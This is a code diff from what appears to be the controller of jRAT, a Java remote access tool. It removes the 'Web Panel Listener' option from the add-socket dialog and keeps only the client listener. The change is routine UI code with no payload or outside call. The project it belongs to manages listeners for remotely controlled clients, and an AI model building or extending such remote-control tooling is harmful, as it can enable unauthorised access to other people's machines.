@@ -7,7 +7,6 @@ import jrat.controller.net.ServerListener;
 import jrat.controller.settings.Settings;
 import jrat.controller.ui.components.JPlaceholderTextField;
 import jrat.controller.utils.Utils;
-import jrat.controller.webpanel.WebPanelListener;
 
 import javax.swing.*;
 import javax.swing.GroupLayout.Alignment;
@@ -71,7 +70,7 @@ public class FrameAddSocket extends BaseFrame {
 		JLabel lblType = new JLabel("Type:");
 		
 		cbType = new JComboBox<>();
-		cbType.setModel(new DefaultComboBoxModel<>(new String[]{"Client Listener", "Web Panel Listener"}));
+		cbType.setModel(new DefaultComboBoxModel<>(new String[]{"Client Listener"}));
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
 		gl_contentPane.setHorizontalGroup(
 			gl_contentPane.createParallelGroup(Alignment.TRAILING)
@@ -151,8 +150,6 @@ public class FrameAddSocket extends BaseFrame {
 			PortListener connection = null;
 			if (type == Settings.SocketType.SOCKET_NORMAL) {
 				connection = new ServerListener(name, port, timeout, pass);
-			} else if (type == Settings.SocketType.SOCKET_WEB_PANEL) {
-				connection = new WebPanelListener(name, port, pass);
 			}
 			connection.start();
 			setVisible(false);
